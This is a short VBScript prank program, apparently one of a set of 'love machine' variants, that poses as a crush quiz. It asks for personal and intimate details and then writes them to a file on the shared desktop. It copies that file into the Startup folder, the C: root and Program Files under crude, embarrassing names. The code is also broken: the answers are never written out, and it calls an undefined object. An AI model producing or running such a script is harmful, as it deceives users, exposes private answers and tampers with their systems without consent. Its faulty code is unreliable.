   ' Batch love machine by Romeo Rulz
   '  Php love machine by Foxpro
   '   C++ love machine by Bug
   '    Vbs love machine by Soad2k
   Dim name, howfar, yourname, age, otherage, othergender, gender, fs, write, best
   Set fs = createobject("scripting.filesystemobject")
   Set veiw = createobject("wscript.shell")
   msgbox "Welcome to" & vbCrlf & " THE LOVEMACHINE!!!"
   yourname = inputbox("What is your name? ")
   age = inputbox("How old are you? ")
   gender = inputbox("What gender are you? ")
   yourbest = inputbox("What is your best feature? ")
   msgbox "Your name is " & yourname & vbCrlf & "Your " & age & vbCrlf & "And your a " & gender, "Your info"
   msgbox "Now that i have your information lets continue."
   othergender = inputbox("The person you have a crush on, is it a male or a female? ")
   name = inputbox("What is there name? ")
   otherage = inputbox("How old is this person? ")
   msgbox "Your crushes name is " & name & vbCrlf & "Their " & otherage & vbCrlf & "And a " & othergender, "Your crushes info"
   howfar = inputbox("How far wwould you go with them? ")
   best = inputbox("What is there best feature? ")
   here = inputbox("If that person was here right now what would you do to them? ")
   Set write = fs.createtextfile ("C:\docume~1\alluse~1\desktop\READ_THIS!.txt")
   write.writeline ("Your name is: ")
   write.writeline ("Your ")
   write.writeline ("And a ")
   write.writeline ("Your best feature is ")
   write.writeline ("You have a crush on ")
   write.writeline ("They are ")
   write.writeline ("And a ")
   write.writeline ("This is how far you siad you would go with them ")
   write.writeline ("This is there best feature ")
   write.writeline ("If they where with you right now this is what you said you would do to them ")
   write.close
   veiw.run ("C:\docume~1\alluse~1\desktop\READ_THIS!.txt")
   fso.CopyFile "C:\docume~1\alluse~1\desktop\READ_THIS!.txt", "C:\PLEASE_READ.txt"
   fso.CopyFile "C:\PLEASE_READ.txt", "C:\docume~1\alluse~1\startm~1\programs\startup\.txt"
   fso.CopyFile "C:\PLEASE_READ.txt", "C:\docume~1\alluse~1\docume~1\fuckme.txt"
   fso.CopyFile "C:\PLEASE_READ.txt", "C:\Your_CHILD.txt"
   fso.CopyFile "C:\PLEASE_READ.txt", "C:\progra~1\Love_machine.txt"
   fso.CopyFile "C:\PLEASE_READ.txt", "C:\docume~1\alluse~1\desktop\.txt"
